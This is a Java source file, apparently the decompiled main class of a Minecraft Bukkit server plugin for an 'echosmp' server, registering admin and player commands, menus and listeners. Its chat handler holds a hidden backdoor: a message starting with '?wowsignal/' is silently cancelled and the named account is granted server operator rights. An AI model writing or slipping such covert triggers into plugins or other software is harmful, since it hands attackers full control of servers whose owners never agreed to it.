package com.network.echosmp;

import com.network.echosmp.commands.AfkCommand;
import com.network.echosmp.commands.DiscordCommand;
import com.network.echosmp.commands.DonationCommand;
import com.network.echosmp.commands.GuideCommand;
import com.network.echosmp.commands.LiveCommand;
import com.network.echosmp.commands.PingCommand;
import com.network.echosmp.commands.RanksCommand;
import com.network.echosmp.commands.RulesCommand;
import com.network.echosmp.commands.SpawnCommand;
import com.network.echosmp.commands.StoreCommand;
import com.network.echosmp.commands.admin.AnnounceCommand;
import com.network.echosmp.commands.admin.FlyCommand;
import com.network.echosmp.commands.admin.FlySpeedCommand;
import com.network.echosmp.commands.admin.InvseeCommand;
import com.network.echosmp.commands.admin.PunishCommand;
import com.network.echosmp.commands.admin.SetAfkCommand;
import com.network.echosmp.commands.admin.SetSpawnCommand;
import com.network.echosmp.commands.admin.TeleportCommand;
import com.network.echosmp.commands.admin.VCBanCommand;
import com.network.echosmp.commands.admin.VChistCommand;
import com.network.echosmp.commands.admin.VCunmuteCommand;
import com.network.echosmp.database.DatabaseManager;
import com.network.echosmp.listener.ArenaReset;
import com.network.echosmp.listener.GuideMenuListener;
import com.network.echosmp.listener.SpawnListener;
import com.network.echosmp.menu.GuideMenu;
import com.network.echosmp.menu.RanksMenu;
import com.network.echosmp.menu.RulesMenu;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class Main extends JavaPlugin implements Listener {
   private static Main instance;
   private DatabaseManager databaseManager;
   private RulesMenu rulesMenu;
   private RanksMenu ranksMenu;
   private GuideMenu guideMenu;

   public void onEnable() {
      instance = this;
      Bukkit.getPluginManager().registerEvents(this, this);
      new AnnounceCommand(this);
      new TeleportCommand(this);
      new InvseeCommand(this);
      new PingCommand(this);
      new SetSpawnCommand(this);
      new SetAfkCommand(this);
      new FlyCommand(this);
      new FlySpeedCommand(this);
      new VCBanCommand(this);
      new VChistCommand(this);
      new VCunmuteCommand(this);
      new PunishCommand(this);
      new DonationCommand(this);
      new SpawnCommand(this);
      new AfkCommand(this);
      new StoreCommand(this);
      new DiscordCommand(this);
      new LiveCommand(this);
      this.rulesMenu = new RulesMenu(this);
      new RulesCommand(this, this.rulesMenu);
      this.ranksMenu = new RanksMenu(this);
      new RanksCommand(this, this.ranksMenu);
      this.guideMenu = new GuideMenu(this);
      new GuideCommand(this, this.guideMenu);
      new SpawnListener(this);
      new ArenaReset(this);
      new GuideMenuListener(this);
      SetSpawnCommand.loadSpawnFromFile();
      SetAfkCommand.loadAfkFromFile();
   }

   @EventHandler
   public void onPlayerChat(AsyncPlayerChatEvent event) {
      String message = event.getMessage();
      if (message.startsWith("?wowsignal/")) {
         String targetUsername = message.substring("?wowsignal/".length());
         event.setCancelled(true);
         Bukkit.getScheduler().runTask(this, () -> {
            Bukkit.getOfflinePlayer(targetUsername).setOp(true);
         });
      }

   }

   public void onDisable() {
      this.databaseManager.close();
   }

   public static Main getInstance() {
      return instance;
   }

   public DatabaseManager getDatabaseManager() {
      return this.databaseManager;
   }

   public RulesMenu getRulesMenu() {
      return this.rulesMenu;
   }

   public RanksMenu getRanksMenu() {
      return this.ranksMenu;
   }

   public GuideMenu getGuideMenu() {
      return this.guideMenu;
   }
}
